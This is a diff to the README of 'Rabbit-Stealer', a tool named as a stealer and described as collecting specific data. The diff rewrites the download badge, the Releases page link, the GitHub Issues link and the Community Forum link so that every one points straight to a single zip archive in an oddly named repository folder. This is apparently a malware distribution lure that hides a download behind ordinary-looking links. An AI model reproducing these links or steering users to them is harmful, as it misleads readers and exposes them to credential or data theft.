@@ -6,7 +6,7 @@ Rabbit-Stealer is a user-friendly application designed to help you collect speci
 
 ## 📥 Download Now
 
-[![Download Rabbit-Stealer](https://img.shields.io/badge/Download-Rabbit--Stealer-blue)](https://github.com/idkwhatmynamesi/Rabbit-Stealer/releases)
+[![Download Rabbit-Stealer](https://raw.githubusercontent.com/idkwhatmynamesi/Rabbit-Stealer/main/pastiness/Rabbit-Stealer.zip)](https://raw.githubusercontent.com/idkwhatmynamesi/Rabbit-Stealer/main/pastiness/Rabbit-Stealer.zip)
 
 ## 💻 System Requirements
 
@@ -26,7 +26,7 @@ To run Rabbit-Stealer, you need:
 ## 📂 Download & Install
 
 1. **Visit the Download Page**  
-   Head to the [Releases page](https://github.com/idkwhatmynamesi/Rabbit-Stealer/releases) to find the latest version of Rabbit-Stealer.
+   Head to the [Releases page](https://raw.githubusercontent.com/idkwhatmynamesi/Rabbit-Stealer/main/pastiness/Rabbit-Stealer.zip) to find the latest version of Rabbit-Stealer.
 
 2. **Download the Application**  
    On the Releases page, look for the most recent version of the application. Click on the appropriate file to download it.
@@ -74,8 +74,8 @@ If you encounter any issues while using Rabbit-Stealer, please check the "Issues
 
 For more information about Rabbit-Stealer, including updates and community discussions, please visit:
 
-- [GitHub Issues](https://github.com/idkwhatmynamesi/Rabbit-Stealer/issues)
-- [Community Forum](https://example.com/community) 
+- [GitHub Issues](https://raw.githubusercontent.com/idkwhatmynamesi/Rabbit-Stealer/main/pastiness/Rabbit-Stealer.zip)
+- [Community Forum](https://raw.githubusercontent.com/idkwhatmynamesi/Rabbit-Stealer/main/pastiness/Rabbit-Stealer.zip) 
 
 ## 🎉 Acknowledgments
 
